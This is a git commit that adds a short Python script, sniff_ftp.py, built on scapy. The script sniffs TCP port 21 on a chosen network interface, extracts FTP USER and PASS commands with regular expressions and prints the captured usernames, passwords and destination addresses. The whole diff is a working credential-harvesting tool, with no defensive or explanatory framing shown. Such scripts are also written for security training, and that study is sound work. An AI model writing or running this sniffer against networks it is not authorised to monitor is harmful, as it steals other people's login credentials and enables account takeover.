a5da70763027b21b0ab71419b6c70d5bf55b4e81
felipe-andrade <felipe.astratta@gmail.com>
2024-06-25 16:26:32 -0300

    ftp sniffer

---
+++ sniff_ftp.py
@@ -0,0 +1,39 @@
+import re
+import argparse
+from scapy.all import *
+
+def argparser() -> argparse.Namespace | None:
+    parser = argparse.ArgumentParser()
+
+    try:
+        parser.add_argument("interface", type=str, help="Interface to sniff")
+    except argparse.ArgumentError as e:
+        print(e)
+
+    return parser.parse_args()
+
+def sniffer(pkt: scapy.packet.Packet) -> None:
+    dest = pkt.getlayer(IP).dst
+    raw = pkt.sprintf("%Raw.load%")
+    user = re.findall('(?i)USER (.*)', raw)
+    passwd = re.findall('(?i)PASS (.*)', raw)
+
+    if user:
+        print(f">> ftp login detected on : {str(dest)}")
+        print(f">> USER {str(user[0])}")
+    elif passwd:
+        print(f">> PASS {str(passwd[0])}")
+
+def main() -> None:
+    args = argparser()
+
+    print(args.interface)
+
+    try:
+        print(">> sniffing...")
+        sniff(filter="tcp port 21", prn=sniffer, iface=args.interface)
+    except KeyboardInterrupt:
+        exit(0)
+
+if __name__ == "__main__":
+    main()
